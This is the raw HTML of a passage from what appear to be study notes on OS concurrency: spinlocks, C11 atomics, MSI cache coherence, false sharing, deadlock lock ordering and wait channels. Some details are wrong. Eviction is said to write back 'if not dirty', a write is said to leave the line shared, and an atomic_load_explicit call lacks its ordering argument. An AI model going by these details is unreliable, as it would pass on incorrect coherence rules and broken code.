        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; spinlock_acquire {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// first check if the lock is busy to reduce coherence traffic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_data_get&lt;/span&gt;(&amp;amp;lk-&amp;gt;lk_lock) != &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;continue&lt;/span&gt;; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// saves CPU cycles
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// attempt to acquire lock
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_data_testandset&lt;/span&gt;(&amp;amp;lk-&amp;gt;lk_lock) != &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;continue&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  lk-&amp;gt;lk_holder = mycpu;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;atomics-c11&#34; &gt;Atomics C11
&lt;span&gt;
    &lt;a href=&#34;#atomics-c11&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Portable support for atomics.&lt;/p&gt;
&lt;p&gt;To implement mutexes you need atomics. Atomics guarantee
something will be written before the next line. (fences). With an Atomic type, all standard ops become sequentially consistent. There&amp;rsquo;s also a variety of memory ordering from no memory ordering to full sequential consistency.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;_Atomic&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;) variable_name = &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;atomic_fetch_add_explicit&lt;/span&gt;(&amp;amp;variable_name, &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, memory_order_relaxed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;atomic_fetch_add_explicit&lt;/span&gt;(&amp;amp;variable_name, -&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, memory_order_relaxed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;atomic_thread_fence&lt;/span&gt;(memory_order_release);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;atomic_store_explicit&lt;/span&gt;(&amp;amp;variable_name, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, memory_order_relaxed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;  x = &lt;span style=&#34;color:#447fcf&#34;&gt;atomic_load_explicit&lt;/span&gt;(&amp;amp;variable_name);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;atomic_thread_fence&lt;/span&gt;(memory_order_acquire);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;_Atomic&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;) packet_count;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;recv_packet&lt;/span&gt;(...) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;atomic_fetch_add_explicit&lt;/span&gt;(&amp;amp;packet_count, &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, memory_order_relaxed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; message msg_buf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;_Atomic&lt;/span&gt;(_Bool) msg_ready;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; message *m) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  msg_buf = *m;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;atomic_thread_fence&lt;/span&gt;(memory_order_release);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;atomic_store_explicit&lt;/span&gt;(&amp;amp;msg_ready, &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  memory_order_relaxed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; message *&lt;span style=&#34;color:#447fcf&#34;&gt;recv&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  _Bool ready = &lt;span style=&#34;color:#447fcf&#34;&gt;atomic_load_explicit&lt;/span&gt;(&amp;amp;msg_ready,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  memory_order_relaxed);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!ready)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;atomic_thread_fence&lt;/span&gt;(memory_order_acquire);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &amp;amp;msg_buf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Spinlock example. The atomic_flag is a special type without support for loads and store. Implemented lock free.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;spin_lock&lt;/span&gt;(atomic_flag *lock) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#447fcf&#34;&gt;atomic_flag_test_and_set_explicit&lt;/span&gt;(lock, memory_order_acquire)) {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;spin_unlock&lt;/span&gt;(atomic_flag *lock) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;atomic_flag_clear_explicit&lt;/span&gt;(lock, memory_order_release);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cache-coherence&#34; &gt;Cache Coherence
&lt;span&gt;
    &lt;a href=&#34;#cache-coherence&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;coherence means accesses to single memory location&lt;/li&gt;
&lt;li&gt;consistency means ordering between multiple locations&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;multicore-caches&#34; &gt;Multicore Caches
&lt;span&gt;
    &lt;a href=&#34;#multicore-caches&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Cache = performance but presents an opportunity for cores to disagree about memory. Cache is divided into chunks of bytes called cache lines. Bus or network is used.&lt;/p&gt;
&lt;h3 id=&#34;3-state-coherence-protocol-msi&#34; &gt;3-State Coherence Protocol (MSI)
&lt;span&gt;
    &lt;a href=&#34;#3-state-coherence-protocol-msi&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Cache lines have 3 states&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Modified
&lt;ul&gt;
&lt;li&gt;One cache has a copy needs to be written back to memory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shared
&lt;ul&gt;
&lt;li&gt;At least one cache have a valid copy&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Invalid
&lt;ul&gt;
&lt;li&gt;No data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;core-and-bus-actions&#34; &gt;Core and Bus Actions
&lt;span&gt;
    &lt;a href=&#34;#core-and-bus-actions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Read (load)
&lt;ul&gt;
&lt;li&gt;Cacheline enters shared state as data is read without modification intent and could come from cache or memory&lt;/li&gt;
&lt;li&gt;Write (store)
&lt;ul&gt;
&lt;li&gt;Invalidates other cache copies&lt;/li&gt;
&lt;li&gt;Cacheline in shared&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Evict
&lt;ul&gt;
&lt;li&gt;Writeback contents to memory if not dirty&lt;/li&gt;
&lt;li&gt;Discard if in shared state&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;multithreaded-design&#34; &gt;Multithreaded Design
&lt;span&gt;
    &lt;a href=&#34;#multithreaded-design&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Avoid false sharing: avoid placing data used by different threads in the same cache line.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; lock;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; _uused[bytes];        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// before C11 / C++ 11 manual padding
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;alignas&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; foo f;  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// C11 / C++ 11
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Avoid contending on cache lines.&lt;/p&gt;
&lt;h3 id=&#34;deadlocks&#34; &gt;Deadlocks
&lt;span&gt;
    &lt;a href=&#34;#deadlocks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Both threads must lock and unlock in the same order.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;lock&lt;/span&gt;(a);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;lock&lt;/span&gt;(b);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;unlock&lt;/span&gt;(b);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;unlock&lt;/span&gt;(a);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;solving-deadlocks&#34; &gt;Solving Deadlocks
&lt;span&gt;
    &lt;a href=&#34;#solving-deadlocks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Avoid circular graphs&lt;/li&gt;
&lt;li&gt;Predefine an order in which each lock should be acquired&lt;/li&gt;
&lt;li&gt;You can use the address of the lock to determine locking order&lt;/li&gt;
&lt;li&gt;When there is a circularity, use a system wide lock or a partial ordering&lt;/li&gt;
&lt;li&gt;Can assert locking order statically (VMware ESX)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;wait-channels&#34; &gt;Wait Channels
&lt;span&gt;
    &lt;a href=&#34;#wait-channels&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// blocks calling thread on wait channel wc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_sleep&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; wchan *wc);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// wakes all threads sleeping on the wait channel
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_wakeall&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; wchan *wc):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// unblocks one threads sleeping on the wait channel
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_wakeone&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; wchan *wc);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
